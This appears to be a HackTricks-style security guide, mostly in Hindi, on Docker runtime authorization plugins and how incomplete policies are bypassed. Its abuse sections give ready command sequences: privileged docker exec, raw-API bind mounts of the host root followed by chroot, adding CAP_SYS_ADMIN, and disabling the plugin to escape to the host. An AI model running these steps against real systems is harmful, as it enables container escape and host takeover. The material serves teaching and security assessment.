# रनटाइम ऑथराइज़ेशन प्लगइन्स

{{#include ../../../banners/hacktricks-training.md}}

## अवलोकन

रनटाइम authorization plugins एक अतिरिक्त नीति परत हैं जो यह तय करती हैं कि कोई caller किसी दिए गए daemon action को कर सकता है या नहीं. Docker क्लासिक उदाहरण है। डिफ़ॉल्ट रूप से, जो भी Docker daemon से बात कर सकता है उसके पास प्रभावी रूप से उस पर व्यापक नियंत्रण होता है। Authorization plugins उस मॉडल को सीमित करने की कोशिश करते हैं: वे authenticated user और अनुरोधित API operation की जाँच करते हैं, और फिर नीति के अनुसार अनुरोध को अनुमति या अस्वीकार करते हैं।

यह विषय अपनी अलग पेज का हकदार है क्योंकि यह exploitation मॉडल बदल देता है जब एक attacker के पास पहले से ही Docker API या `docker` group में किसी user तक पहुँच होती है। ऐसे वातावरण में सवाल अब केवल "can I reach the daemon?" नहीं रह जाता, बल्कि यह भी होता है: "is the daemon fenced by an authorization layer, and if so, can that layer be bypassed through unhandled endpoints, weak JSON parsing, or plugin-management permissions?"

## Operation

जब कोई request Docker daemon तक पहुँचती है, तो authorization subsystem उस request context को एक या अधिक इंस्टॉल किए गए plugins को पास कर सकता है। plugin authenticated user identity, request details, चुने हुए headers, और request या response body के भागों को तब देखता है जब content type उपयुक्त हो। कई plugins को chain किया जा सकता है, और access तभी प्रदान किया जाता है जब सभी plugins अनुरोध की अनुमति दें।

यह मॉडल मजबूत लगता है, लेकिन इसकी सुरक्षा पूरी तरह इस बात पर निर्भर करती है कि नीति लेखक ने API को कितनी पूरी तरह समझा था। एक plugin जो `docker run --privileged` को ब्लॉक करता है लेकिन `docker exec` को अनदेखा करता है, top-level `Binds` जैसे alternate JSON keys को मिस करता है, या plugin administration की अनुमति देता है, वह प्रतिबंध का गलत भाव दे सकता है जबकि सीधे privilege-escalation रास्ते खुले ही रह सकते हैं।

## Common Plugin Targets

नीतियों की समीक्षा के लिए महत्वपूर्ण क्षेत्र हैं:

- container creation endpoints
- `HostConfig` fields such as `Binds`, `Mounts`, `Privileged`, `CapAdd`, `PidMode`, and namespace-sharing options
- `docker exec` behavior
- plugin management endpoints
- any endpoint that can indirectly trigger runtime actions outside the intended policy model

ऐतिहासिक रूप से, Twistlock's `authz` plugin और शैक्षिक उदाहरणों जैसे `authobot` जैसे सरल plugins ने इस मॉडल को पढ़ना आसान बनाया क्योंकि उनके policy फाइल्स और code paths दिखाते थे कि endpoint-to-action mapping वास्तव में कैसे लागू किया गया था। assessment कार्य के लिए, महत्वपूर्ण सबक यह है कि नीति लेखक को केवल सबसे दिखाई देने वाले CLI commands नहीं बल्कि पूरी API surface को समझना चाहिए।

## दुरुपयोग

पहला लक्ष्य यह सीखना है कि वास्तव में क्या ब्लॉक किया गया है। यदि daemon किसी action को deny करता है, तो error अक्सर leaks the plugin name, जो उपयोग में नियंत्रण की पहचान करने में मदद करता है:
```bash
docker ps
docker run --rm -it --privileged ubuntu:24.04 bash
docker plugin ls
```
यदि आपको व्यापक endpoint profiling की आवश्यकता है, तो `docker_auth_profiler` जैसे टूल उपयोगी होते हैं क्योंकि वे उस बार‑बार दोहराए जाने वाले कार्य को स्वचालित कर देते हैं — यह जांचना कि plugin वास्तविक रूप से किन API routes और JSON structures की अनुमति देता है।

यदि environment किसी custom plugin का उपयोग करता है और आप API के साथ इंटरैक्ट कर सकते हैं, तो यह गिनें कि किन object fields को वास्तव में फ़िल्टर किया गया है:
```bash
docker version
docker inspect <container> 2>/dev/null | head
curl --unix-socket /var/run/docker.sock http:/version
curl --unix-socket /var/run/docker.sock http:/v1.41/containers/json
```
ये चेक मायने रखते हैं क्योंकि कई authorization failures अवधारणा-विशेष के बजाय फ़ील्ड-विशेष होती हैं। एक plugin CLI पैटर्न को अस्वीकार कर सकता है बिना समतुल्य API संरचना को पूरी तरह ब्लॉक किए।

### पूरा उदाहरण: `docker exec` कंटेनर निर्माण के बाद विशेषाधिकार जोड़ता है

एक policy जो privileged container creation को ब्लॉक करती है लेकिन unconfined container creation और `docker exec` को अनुमति देती है, फिर भी बाईपास की जा सकती है:
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu:24.04 sleep infinity
docker ps
docker exec -it --privileged <container_id> bash
```
यदि daemon दूसरे चरण को स्वीकार कर लेता है, तो उपयोगकर्ता ने उस container के भीतर एक privileged interactive process पुनः प्राप्त कर लिया है, जिसे policy author ने constrained माना था।

### Full Example: Bind Mount Through Raw API

कुछ broken policies केवल एक JSON shape ही inspect करती हैं। यदि root filesystem bind mount को लगातार blocked नहीं किया गया, तो host फिर भी mounted किया जा सकता है:
```bash
docker version
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","Binds":["/:/host"]}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> chroot /host /bin/bash
```
इसी विचार का उपयोग `HostConfig` के अंतर्गत भी दिखाई दे सकता है:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"Binds":["/:/host"]}}' \
http:/v1.41/containers/create
```
प्रभाव एक पूर्ण host filesystem escape है। दिलचस्प बात यह है कि यह bypass incomplete policy coverage के कारण होता है, न कि किसी kernel bug के कारण।

### पूर्ण उदाहरण: Unchecked Capability Attribute

यदि policy किसी capability-related attribute को filter करना भूल जाए, तो attacker एक container बना सकता है जो एक खतरनाक capability को पुनः प्राप्त कर ले:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"CapAdd":["SYS_ADMIN"]}}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> bash
capsh --print
```
एक बार `CAP_SYS_ADMIN` या इसी तरह मजबूत capability मौजूद होने पर, [capabilities.md](protections/capabilities.md) और [privileged-containers.md](privileged-containers.md) में वर्णित कई breakout techniques तक पहुँच संभव हो जाती है।

### पूर्ण उदाहरण: Plugin को अक्षम करना

यदि plugin-management operations की अनुमति है, तो सबसे साफ़ bypass संभवतः नियंत्रण को पूरी तरह बंद कर देना हो सकता है:
```bash
docker plugin ls
docker plugin disable <plugin_name>
docker run --rm -it --privileged -v /:/host ubuntu:24.04 chroot /host /bin/bash
docker plugin enable <plugin_name>
```
यह control-plane स्तर पर एक policy विफलता है। authorization layer मौजूद है, लेकिन जिस user को यह प्रतिबंधित करने के लिए होना चाहिए था, उसके पास इसे disable करने की अनुमति अभी भी बनी हुई है।

## जाँच

ये commands इस बात की पहचान करने के लिए हैं कि क्या कोई policy layer मौजूद है और क्या वह पूर्ण है या सतही।
```bash
docker plugin ls
docker info 2>/dev/null | grep -i authorization
docker run --rm -it --privileged ubuntu:24.04 bash
curl --unix-socket /var/run/docker.sock http:/v1.41/plugins 2>/dev/null
```
What is interesting here:

- जिस denial संदेश में plugin का नाम शामिल होता है, वह authorization layer की पुष्टि करता है और अक्सर सटीक implementation का खुलासा कर देता है।
- Attacker के लिए दिखाई देने वाली plugin सूची यह पता लगाने के लिए पर्याप्त हो सकती है कि disable या reconfigure ऑपरेशंस संभव हैं या नहीं।
- जो policy केवल स्पष्ट CLI actions को ब्लॉक करती है पर raw API requests को नहीं, उसे bypassable माना जाना चाहिए जब तक कि इसका विपरीत प्रमाणित न हो।

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | डिफ़ॉल्ट रूप से सक्षम नहीं | Daemon access प्रभावी रूप से all-or-nothing होता है जब तक कि कोई authorization plugin configured न हो | incomplete plugin policy, blacklists instead of allowlists, allowing plugin management, field-level blind spots |
| Podman | Not a common direct equivalent | Podman typically relies more on Unix permissions, rootless execution, and API exposure decisions than on Docker-style authz plugins | exposing a rootful Podman API broadly, weak socket permissions |
| containerd / CRI-O | Different control model | These runtimes usually rely on socket permissions, node trust boundaries, and higher-layer orchestrator controls rather than Docker authz plugins | mounting the socket into workloads, weak node-local trust assumptions |
| Kubernetes | Uses authn/authz at the API-server and kubelet layers, not Docker authz plugins | Cluster RBAC and admission controls are the main policy layer | overbroad RBAC, weak admission policy, exposing kubelet or runtime APIs directly |
